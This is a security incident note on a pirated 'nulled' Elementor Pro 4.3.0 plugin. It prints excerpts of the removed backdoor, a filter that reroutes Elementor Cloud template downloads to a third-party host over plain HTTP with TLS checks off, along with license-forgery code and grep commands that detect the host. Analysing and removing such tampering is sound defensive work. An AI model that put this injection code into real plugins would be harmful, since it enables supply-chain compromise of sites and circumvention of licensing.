# Security Note — Elementor Pro "nulled" redistribution (backdoor removed)

**Date:** 2026-09 (scan of local working copy)
**Scope:** `elementor-pro/` (Elementor Pro 4.3.0, 1326 files, untracked local copy)
**Status:** Backdoor removed — plugin entry file restored to upstream behaviour

---

## 1. Summary

The local `elementor-pro/` directory was **not** an official Elementor Pro distribution. It
was extracted from `C:\Users\pc\Desktop\elementor-pro-4.3.0_nulled.zip` (byte-identical,
1326 files) — a pirated "nulled" redistribution with a tampered entry file.

The tamper contained **one high-severity supply-chain backdoor** plus a license-forgery
payload. Both have been removed.

The rest of the plugin tree was clean: no `eval`, no shell execution, no obfuscated or
base64-encoded payloads, no hidden files, no IP-based C2, no credential exfiltration, no
miner, and no unexplained outbound hosts. The Composer `vendor/` directory is a benign
empty autoloader.

---

## 2. The injected payload

`elementor-pro.php` lines 16–44 (removed) contained four items:

### 2.1 HIGH — Elementor Cloud templates routed to a third-party host

```php
add_action( 'plugins_loaded', function() {
    add_filter( 'pre_http_request', function( $pre, $parsed_args, $url ) {
        // ...
        } elseif ( strpos( $url, 'my.elementor.com/api/connect/v1/library/get_template_content' ) !== false ) {
            $response = wp_remote_get( "http://wn.norefer.fyi/elementor/templates/{$parsed_args['body']['id']}.json",
                                        [ 'sslverify' => false, 'timeout' => 25 ] );
```

A `pre_http_request` filter intercepted the official Elementor library endpoint and
redirected the fetch to `wn.norefer.fyi` — over **plain HTTP** with **TLS verification
disabled**.

Impact: any template imported or downloaded from Elementor Cloud was fetched from a host
fully controlled by a third party, with no transport integrity guarantee. Whoever controls
that host can inject arbitrary HTML/JavaScript into the site (stored XSS, defacement,
credential/card harvesting, web shells).

Host state at time of scan: `wn.norefer.fyi` → `104.21.32.76` / `172.67.184.103`
(Cloudflare), live and serving (`301` → HTTPS → `404` for invalid template IDs).

### 2.2 MEDIUM — License forgery executed on every request

```php
update_option( 'elementor_pro_license_key', '*********' );
update_option( '_elementor_pro_license_v2_data', [ ... 'license' => 'valid', 'expires' => '01.01.2030' ... ] );
add_filter( 'elementor/connect/additional-connect-info', '__return_empty_array', 999 );
```

These sat at **file scope**, so they ran on every request that loaded the plugin file,
continuously overwriting the site's real license key.

### 2.3 MEDIUM — License API response interception

The same `pre_http_request` filter returned a forged `success: true, license: valid`
response for `my.elementor.com/api/v2/licenses`.

### 2.4 INFO — Tamper markers

- `'ОК'` (Cyrillic, former line 30) — a common string in Russian-language nulling releases.
- `add_filter( 'elementor/connect/additional-connect-info', '__return_empty_array', 999 )`.

---

## 3. Remediation performed

| # | Action | Result |
|---|--------|--------|
| 1 | Removed injected block `elementor-pro.php:16-44` | Entry file restored to upstream behaviour |
| 2 | Normalised blank line to upstream formatting | Cosmetic only |
| 3 | Added `elementor-pro/` to `.gitignore` | Prevents accidental commit of the 17 MB vendor tree |
| 4 | Re-ran full malware scan on all 1326 files | Clean (see §4) |

Verification of step 1: `diff` against the original nulled file shows the **only**
difference is the removed block — all upstream code (including
`add_action( 'plugins_loaded', 'elementor_pro_load_plugin' )`) is untouched.

Structural validation of the patched file: brace / paren / bracket balance all `0`, no
unterminated strings or comments, correct `<?php` header and closing braces.

---

## 4. Post-remediation verification

```
backdoor markers      : none
top-level side effects: none
obfuscation           : none
unexplained hosts     : none
```

Residual `__return_empty_array` hits are legitimate WordPress core usage
(`months_dropdown_results` date pickers in the fonts/icons managers).

Every remaining outbound host in the plugin resolves to a legitimate vendor service
(Stripe, PayPal, Mailchimp/MailerLite/GetDrip/GetResponse/ConvertKit, ActiveCampaign,
Slack, Discord, Facebook, WhatsApp, Adobe Fonts, Typekit, FontAwesome, cdnjs,
WordPress.org, Akismet).

---

## 5. Consequences and residual risk

### 5.1 The plugin now requires a genuine license

Removing the forgery means Elementor Pro will report an invalid/expired license until a
valid license key is entered. This is expected and correct — the previous "valid"
status was fabricated.

### 5.2 The code itself is still an unlicensed redistribution

Even with the backdoor removed, this copy originated from a pirated distribution and
carries the Elementor Pro license terms violation. The clean resolution is to delete it
and install the official build with a valid license. The patched copy is retained only
as a reference working copy.

### 5.3 Server-side verification could not be completed from this environment

Network egress to `downloads.elementor.com`, `api.github.com` and the staging host
(`148.230.101.241:16916`) was blocked, so:

- A byte-for-byte diff against the official Elementor Pro 4.3.0 release was **not**
  possible. The scan is heuristic.
- It could **not** be confirmed whether the nulled plugin was ever installed on the
  staging or production WordPress.

**Action required on the server** (run on staging first, per project rules):

```bash
# Is the nulled plugin installed?
ls -d /www/wwwroot/backend.autospajakarta.com/wp-content/plugins/elementor-pro

# If present, check whether the tampered entry file was deployed:
grep -n "wn.norefer.fyi\|pre_http_request\|elementor_pro_license_key" \
  /www/wwwroot/backend.autospajakarta.com/wp-content/plugins/elementor-pro/elementor-pro.php

# If the tampered file was ever deployed, reset the forged options:
wp option delete elementor_pro_license_key
wp option delete _elementor_pro_license_v2_data
wp transient delete elementor_pro_license_data

# Check for the redirect as an outbound connection (server logs / proxy logs):
grep -R "wn.norefer.fyi" /var/log/ 2>/dev/null
```

If the tampered file was ever live, also audit: `wp option` values for the two options
above, `elementor_pro_license_data` transient, any content synced from Elementor Cloud
templates between the compromise date and remediation, and outbound traffic to
`wn.norefer.fyi`.

---

## 6. Prevention

- Never install WordPress plugins from "nulled"/cracked archives. The redistribution
  channel is untrusted and the paywall bypass is a convenient carrier for backdoors.
- Keep vendor plugin trees out of the application repository (`.gitignore` rule added).
- Prefer official distribution channels: `elementor.com` or `wordpress.org` for the free
  plugin.
